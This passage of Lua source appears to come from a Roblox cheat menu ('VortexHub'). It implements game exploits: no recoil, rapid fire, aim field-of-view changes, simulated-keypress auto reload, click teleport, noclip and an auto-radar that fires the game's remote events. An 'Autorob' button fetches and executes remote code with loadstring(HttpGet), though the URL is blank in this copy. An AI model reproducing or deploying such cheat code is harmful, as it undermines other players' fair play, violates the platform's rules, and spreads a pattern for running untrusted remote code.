	script.Parent.MouseButton1Down:connect(Click)
	
end
task.spawn(SCRIPT_4f)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.NoRecoil.Function \\ --
local function SCRIPT_5c()
local script = UI["5c"]
	local plr 	 = game:GetService("Players").LocalPlayer
	local Status = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if Status == false then
			script.Parent.Text = "No Recoil: ON"
			Status = true
			while Status == true do
			local Tool = plr.Character:FindFirstChildOfClass('Tool')
				if not Tool then 
					
			else
				Tool:SetAttribute("Recoil", 0)
					Tool:SetAttribute("Instability", 0)
			end
			wait(0.1)
			end
			
		else 
			script.Parent.Text = "No Recoil: OFF"
			Status = false
		end
			
		
	end)
end
task.spawn(SCRIPT_5c)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.NoRecoil.animation \\ --
local function SCRIPT_5d()
local script = UI["5d"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_5d)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.NoRecoil.Click Sound \\ --
local function SCRIPT_5e()
local script = UI["5e"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_5e)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.RapidFire.animation \\ --
local function SCRIPT_64()
local script = UI["64"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_64)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.RapidFire.Click Sound \\ --
local function SCRIPT_65()
local script = UI["65"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_65)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.RapidFire.Function \\ --
local function SCRIPT_66()
local script = UI["66"]
	local plr 	 = game:GetService("Players").LocalPlayer
	local Status = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if Status == false then
			script.Parent.Text = "Rapid Fire: ON"
			Status = true
			while Status == true do
			local Tool = plr.Character:FindFirstChildOfClass('Tool')
				if not Tool then 
					
			else
					Tool:SetAttribute("ShootDelay", 0)
					Tool:SetAttribute("Automatic", true)
			end
			wait(0.1)
			end
			
		else 
			script.Parent.Text = "Rapid Fire: OFF"
			Status = false
		end
			
		
	end)
end
task.spawn(SCRIPT_66)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AimFOV.animation \\ --
local function SCRIPT_6d()
local script = UI["6d"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_6d)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AimFOV.Click Sound \\ --
local function SCRIPT_6e()
local script = UI["6e"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_6e)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AimFOV.Function \\ --
local function SCRIPT_71()
local script = UI["71"]
	local plr 	 = game:GetService("Players").LocalPlayer
	local Status = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if Status == false then
			script.Parent.Text = "Aim FOV: ON"
			Status = true
			while Status == true do
			local Tool = plr.Character:FindFirstChildOfClass('Tool')
				if not Tool then 
					
			else
					Tool:SetAttribute("AimFieldOfView", 70)
			end
			wait(0.1)
			end
			
		else 
			script.Parent.Text = "Aim FOV: OFF"
			Status = false
		end
			
		
	end)
end
task.spawn(SCRIPT_71)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.SmallCrosshair.animation \\ --
local function SCRIPT_77()
local script = UI["77"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_77)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.SmallCrosshair.Click Sound \\ --
local function SCRIPT_78()
local script = UI["78"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_78)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.SmallCrosshair.Function \\ --
local function SCRIPT_79()
local script = UI["79"]
	local plr 	 = game:GetService("Players").LocalPlayer
	local Status = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if Status == false then
			script.Parent.Text = "Crosshair: 2"
			Status = true
			while Status == true do
			local Tool = plr.Character:FindFirstChildOfClass('Tool')
				if not Tool then 
					
			else
					Tool:SetAttribute("CrosshairSize", 1)
			end
			wait(0.1)
			end
			
		else 
			script.Parent.Text = "Crosshair: 1"
			Status = false
		end
			
		
	end)
end
task.spawn(SCRIPT_79)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AutoReload.animation \\ --
local function SCRIPT_80()
local script = UI["80"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_80)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AutoReload.Click Sound \\ --
local function SCRIPT_81()
local script = UI["81"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_81)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.GunMods.ScrollingFrame.AutoReload.Function \\ --
local function SCRIPT_82()
local script = UI["82"]
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local VirtualInputManager = game:GetService("VirtualInputManager")
	
	local trackedWeapons = {
		"G36",
		"Glock 17",
		"MP5",
		"M4 Carabine",
		"Sniper",
		"M58B Shotgun"
	}
	
	local autoRefillEnabled = false 
	
	local AutoReloadButton = script.Parent 
	
	AutoReloadButton.Text = "Auto Reload: OFF"
	
	local function trackAmmo()
		while true do
			if autoRefillEnabled then
				pcall(function()
					local character = LocalPlayer.Character
					if character then
						for _, weaponName in ipairs(trackedWeapons) do
							local weapon = character:FindFirstChild(weaponName) or workspace:FindFirstChild(weaponName)
							if weapon then
								local magSize = weapon:GetAttribute("MagCurrentSize") 
									or weapon:GetAttribute("Ammo") 
									or weapon:GetAttribute("Clip")
									or weapon:FindFirstChild("Ammo") 
									and weapon.Ammo.Value
	
								if magSize and magSize == 0 then
									VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.R, false, game)
									task.wait(0.1)
									VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.R, false, game)
									task.wait(1)
								end
							end
						end
					end
				end)
			end
			task.wait(0.5)
		end
	end
	
	local function toggleAutoRefill()
		autoRefillEnabled = not autoRefillEnabled
		if autoRefillEnabled then
			AutoReloadButton.Text = "Auto Reload: ON"
		else
			AutoReloadButton.Text = "Auto Reload: OFF"
		end
		return autoRefillEnabled
	end
	
	AutoReloadButton.MouseButton1Click:Connect(toggleAutoRefill)
	
	trackAmmo()
end
task.spawn(SCRIPT_82)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.XUI.closebutton.CloseScript \\ --
local function SCRIPT_90()
local script = UI["90"]
	local frame = script.Parent.Parent.Parent.Parent.Parent.MainTab
	
	script.Parent.MouseButton1Click:Connect(function()
		frame:Destroy()
	end)
	
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://17208361335"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
		
	end
	
	script.Parent.MouseButton1Down:connect(Click)
	
end
task.spawn(SCRIPT_90)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.Click Sound \\ --
local function SCRIPT_ba()
local script = UI["ba"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_ba)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.ClickToCopy \\ --
local function SCRIPT_bb()
local script = UI["bb"]
	local copy = "https://discord.gg/novahub" script.parent.MouseButton1Click:Connect(function(plr) setclipboard(tostring(copy)) end)
end
task.spawn(SCRIPT_bb)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.Click Sound \\ --
local function SCRIPT_c6()
local script = UI["c6"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_c6)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.ClickToCopy \\ --
local function SCRIPT_c7()
local script = UI["c7"]
	local copy = "" script.parent.MouseButton1Click:Connect(function(plr) setclipboard(tostring(copy)) end)
end
task.spawn(SCRIPT_c7)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.teleport.TPScript \\ --
local function SCRIPT_d6()
local script = UI["d6"]
	if _G.WRDClickTeleport == nil then
		_G.WRDClickTeleport = true
	
		local player = game:GetService("Players").LocalPlayer
		local UserInputService = game:GetService("UserInputService")
		local mouse = player:GetMouse()
	
		
		local lastTeleportTime = 0
		local cooldown = 1.3 
	
		repeat wait() until mouse
	
		UserInputService.InputBegan:Connect(function(input, gameProcessed)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				if _G.WRDClickTeleport and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
					local currentTime = tick()
					if currentTime - lastTeleportTime >= cooldown then
						lastTeleportTime = currentTime
						player.Character:MoveTo(Vector3.new(mouse.Hit.x, mouse.Hit.y, mouse.Hit.z))
					else
						
						
					end
				end
			end
		end)
	else
		_G.WRDClickTeleport = not _G.WRDClickTeleport
		if _G.WRDClickTeleport then
			game.StarterGui:SetCore("SendNotification", {
				Title = "VortexHub",
				Text = "Click Teleport activated (1 second cooldown)",
				Duration = 3
			})
		else
			game.StarterGui:SetCore("SendNotification", {
				Title = "VortexHub",
				Text = "Click teleport disabled",
				Duration = 3
			})
		end
	end
	
end
task.spawn(SCRIPT_d6)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.teleport.animation \\ --
local function SCRIPT_d7()
local script = UI["d7"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_d7)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.teleport.Click Sound \\ --
local function SCRIPT_d8()
local script = UI["d8"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_d8)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Autorob.animation \\ --
local function SCRIPT_de()
local script = UI["de"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_de)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Autorob.Click Sound \\ --
local function SCRIPT_df()
local script = UI["df"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_df)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Autorob.LocalScript \\ --
local function SCRIPT_e0()
local script = UI["e0"]
	function Click(mouse)
	
		loadstring(game:HttpGet(""))()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_e0)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Noclip.animation \\ --
local function SCRIPT_e6()
local script = UI["e6"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_e6)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Noclip.Click Sound \\ --
local function SCRIPT_e7()
local script = UI["e7"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_e7)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Noclip.LocalScript \\ --
local function SCRIPT_e8()
local script = UI["e8"]
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local player = Players.LocalPlayer
	local button = script.Parent
	
	local noclip = false
	
	-- Funktion zum Umschalten
	local function toggleNoclip()
		noclip = not noclip
		button.Text = noclip and "Noclip: AN" or "Noclip: AUS"
	
		-- Wenn Noclip ausgeschaltet wird, alle Teile wieder auf CanCollide = true setzen
		if not noclip and player.Character then
			for _, part in pairs(player.Character:GetDescendants()) do
				if part:IsA("BasePart") then
					part.CanCollide = true
				end
			end
		end
	end
	
	-- Wenn der Button geklickt wird
	button.MouseButton1Click:Connect(toggleNoclip)
	
	-- Laufende Ãœberwachung (wenn Noclip an ist)
	RunService.Stepped:Connect(function()
		if noclip and player.Character then
			for _, part in pairs(player.Character:GetDescendants()) do
				if part:IsA("BasePart") then
					part.CanCollide = false
				end
			end
		end
	end)
	
end
task.spawn(SCRIPT_e8)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Respawn.animation \\ --
local function SCRIPT_ee()
local script = UI["ee"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_ee)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Respawn.Click Sound \\ --
local function SCRIPT_ef()
local script = UI["ef"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_ef)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Respawn.LocalScript \\ --
local function SCRIPT_f0()
local script = UI["f0"]
	function Click(mouse)
	
	game.Players.LocalPlayer.Character.Head:Destroy()
	if game.Players.LocalPlayer.Character.Humanoid.Health < 5 then 
		local deathmanok = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
		wait(0)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(deathmanok)
	end
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_f0)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.ExitCar.animation \\ --
local function SCRIPT_f6()
local script = UI["f6"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_f6)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.ExitCar.Click Sound \\ --
local function SCRIPT_f7()
local script = UI["f7"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_f7)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.ExitCar.LocalScript \\ --
local function SCRIPT_f8()
local script = UI["f8"]
	script.Parent.MouseButton1Up:Connect(function()
		game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
	end)
end
task.spawn(SCRIPT_f8)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.AutoRadar.animation \\ --
local function SCRIPT_100()
local script = UI["100"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_100)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.AutoRadar.Click Sound \\ --
local function SCRIPT_101()
local script = UI["101"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_101)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.AutoRadar.AutoradarScript \\ --
local function SCRIPT_102()
local script = UI["102"]
	local RunService = game:GetService("RunService")
	local radarRemoteEvent = game:GetService("ReplicatedStorage").ZDD["33b83d12-cf41-43c5-9370-45721b8b0e80"]
	
	local autoRadarToggle = false
	
	script.Parent.MouseButton1Click:Connect(function()
		autoRadarToggle = not autoRadarToggle
